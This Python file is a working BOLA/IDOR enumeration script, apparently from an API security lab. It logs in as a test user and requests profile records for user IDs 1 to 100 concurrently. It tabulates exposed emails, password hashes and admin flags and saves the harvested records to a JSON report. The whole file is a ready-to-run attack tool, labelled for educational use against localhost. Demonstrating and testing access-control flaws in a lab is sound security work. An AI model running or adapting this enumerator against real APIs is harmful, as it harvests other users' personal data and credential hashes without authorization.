"""
BOLA/IDOR Enumeration Script
=============================
Authenticates as user1 and enumerates /api/users/{id}/profile for IDs 1-100.
Demonstrates Broken Object Level Authorization (OWASP API1:2023).

Usage:
    TARGET_URL=http://localhost:8000 python offensive/bola_enum.py
    TARGET_URL=http://localhost:8080 python offensive/bola_enum.py  # via Kong
"""
import asyncio
import json
import os
import time

import httpx
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

console = Console()
BASE_URL = os.getenv("TARGET_URL", "http://localhost:8000")
ID_RANGE = range(1, 101)
CONCURRENCY = 10  # semaphore limit


async def get_token(client: httpx.AsyncClient) -> str:
    resp = await client.post(
        f"{BASE_URL}/auth/login",
        json={"username": "user1", "password": "password1"},
    )
    if resp.status_code != 200:
        console.print(f"[red]Login failed: {resp.status_code} {resp.text}[/]")
        raise SystemExit(1)
    return resp.json()["access_token"]


async def fetch_profile(
    client: httpx.AsyncClient, token: str, user_id: int, sem: asyncio.Semaphore
) -> tuple[int, int, dict | None]:
    async with sem:
        try:
            resp = await client.get(
                f"{BASE_URL}/api/users/{user_id}/profile",
                headers={"Authorization": f"Bearer {token}"},
                timeout=5.0,
            )
            data = resp.json() if resp.status_code == 200 else None
            return user_id, resp.status_code, data
        except Exception as e:
            return user_id, -1, None


async def run_enumeration():
    console.print(Panel.fit(
        f"[bold red]BOLA/IDOR Enumerator[/]\nTarget: {BASE_URL}\nID range: 1-100\n"
        "[yellow]This attack enumerates all user profiles without authorization checks.[/]",
        title="[red]OFFENSIVE TOOL — EDUCATIONAL USE ONLY[/]"
    ))

    async with httpx.AsyncClient() as client:
        token = await get_token(client)
        console.print(f"[green][+] Authenticated as user1[/]\n")

        sem = asyncio.Semaphore(CONCURRENCY)
        start = time.time()

        tasks = [fetch_profile(client, token, uid, sem) for uid in ID_RANGE]
        results = await asyncio.gather(*tasks)
        elapsed = time.time() - start

    # Build results table
    table = Table(title=f"BOLA Enumeration Results ({elapsed:.2f}s)", show_lines=True)
    table.add_column("ID", style="cyan", justify="right")
    table.add_column("HTTP", justify="center")
    table.add_column("Username", style="yellow")
    table.add_column("Email", style="red")
    table.add_column("Leaked Fields", style="magenta")

    exposed = 0
    leaked_data = []

    for user_id, status, data in sorted(results):
        if status == 200 and data:
            exposed += 1
            leaked = [
                f for f in ["password_hash", "is_admin", "internal_id", "failed_login_count"]
                if f in data
            ]
            table.add_row(
                str(user_id),
                "[green]200 OK[/]",
                data.get("username", "N/A"),
                data.get("email", "N/A"),
                ", ".join(leaked) if leaked else "[dim]none[/]",
            )
            leaked_data.append(data)
        elif status == 403:
            table.add_row(str(user_id), "[yellow]403 FORBIDDEN[/]", "-", "-", "[green]PROTECTED[/]")
        elif status == 404:
            table.add_row(str(user_id), "[dim]404[/]", "-", "-", "-")

    console.print(table)
    console.print(
        f"\n[bold {'red' if exposed > 0 else 'green'}]"
        f"Exposed profiles: {exposed} / {len([r for r in results if r[1] != 404])} users found[/]"
    )

    if leaked_data:
        console.print("\n[bold red]Sample leaked record:[/]")
        console.print_json(json.dumps(leaked_data[0], default=str))

    # Save JSON report
    report_path = "reports/bola_enum_results.json"
    os.makedirs("reports", exist_ok=True)
    with open(report_path, "w") as f:
        json.dump({"exposed_count": exposed, "results": leaked_data}, f, default=str, indent=2)
    console.print(f"\n[dim]Full report saved to {report_path}[/]")


if __name__ == "__main__":
    asyncio.run(run_enumeration())
